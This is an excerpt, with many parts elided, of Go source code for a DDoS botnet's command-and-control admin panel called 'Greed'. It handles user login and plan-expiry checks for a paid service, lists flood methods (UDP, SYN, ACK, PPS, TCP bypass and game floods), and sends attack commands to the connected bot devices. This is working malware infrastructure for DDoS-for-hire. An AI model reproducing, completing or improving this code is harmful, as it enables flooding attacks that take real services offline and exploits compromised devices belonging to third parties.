...
func generateRandomCaptcha() string {
	const charset = "starGREED"
	tokenLength := 4 // You can adjust the length of the captcha token as needed
...
func Admin(conn net.Conn) {
	defer conn.Close()
	if _, err := conn.Write([]byte("\x1bc\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22\033]0;I love *67, I love GREED\007")); err != nil {
		return
	}
	...
	// username
	username, err := Read(conn, "\x1b[37mGreed@botnet:~# ", "", 20)
	if err != nil {
		return
	}
	...
	if err != nil || account == nil {
		conn.Write([]byte("\x1b[37mCommand not found!"))
		time.Sleep(50 * time.Millisecond)
		return
	}

	// password
	password, err := Read(conn, "\x1b[37mGreed@botnet:~# ", "*", 20)
	if err != nil {
		return
	...
	if account.NewUser {
		conn.Write([]byte("\x1b[37mChange password\r\n"))
		newpassword, err := Read(conn, "\x1b[37mGreed@botnet:~# ", "*", 20)
		if err != nil {
			return
		}

		if err := ModifyField(account, "password", newpassword); err != nil {
			conn.Write([]byte("\x1b[37mYou can't change password!"))
			time.Sleep(50 * time.Millisecond)
			return
		}
	...
	if account.Expiry <= time.Now().Unix() {
		conn.Write([]byte("\x1b[37mYour plan has expired!\x1b[0m"))
	...
	conn.Write([]byte("\r\n\x1b[37mI love *67, I love Greed\r\n"))
	conn.Write([]byte("\x1b[37mFor help '?'\r\n\r\n"))
	for {
		command, err := ReadWithHistory(conn, fmt.Sprintf("\x1b[37m%s@botnet:~# ", session.User.Username), "", 60, session.History)
		if err != nil {
			return
		}
		...
		case "clear", "cls", "c":
			...
			conn.Write([]byte("\033[2J\033[1H"))
			conn.Write([]byte("\r\n\x1b[37mI love *67, I love Greed\r\n"))
			conn.Write([]byte("\x1b[37mIf you need help type '?'\r\n\r\n"))
			continue
		...
		case "methods", "syntax":
			...
			session.Conn.Write([]byte("\x1b[37mudpthread: udp flood with threads.\r\n"))
			session.Conn.Write([]byte("\x1b[37msynflood: tcp flooding with syn flags.\r\n"))
			session.Conn.Write([]byte("\x1b[37mackflood: tcp flooding with ack flags.\r\n"))
			session.Conn.Write([]byte("\x1b[37mppsflood: udp flood for high pps.\r\n"))
			session.Conn.Write([]byte("\x1b[37msackflood: custom ack flood.\r\n"))
			session.Conn.Write([]byte("\x1b[37msocket: tcp flood for high connections.\r\n"))
			session.Conn.Write([]byte("\x1b[37mtcpbypass: tcp custom flood for bypassing.\r\n"))
			...
			session.Conn.Write([]byte("\x1b[37mgame: tcp based custom flood for games.\r\n\r\n"))
		case "?", "help":
			access := 2
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mmethods - shows all methods \x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mcls - clears terminal\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mbots - view what type of bots are connected\x1b[0m\r\n"))

		case "attacks": // Enable/Disable attacks possible.
			args := strings.Split(strings.ToLower(command), " ")[1:]
			if !session.User.Admin || len(args) == 0 {
				session.Conn.Write([]byte("\x1b[37mADMIN ONLY!\r\n"))
				continue
			}
		...
		default:
			...
			if !ok && attack == nil {
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;16m`\x1b[37m\x1b[9m%s\x1b[0m\x1b[38;5;16m`\x1b[37m huh??\x1b[0m\r\n", strings.Split(strings.ToLower(command), " ")[0])))
				continue
			}
			...
			if len(Clients) <= 1 { // 1 or less clients broadcasted too
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mAttack sent w %d devices!\x1b[0m\r\n", len(Clients))))
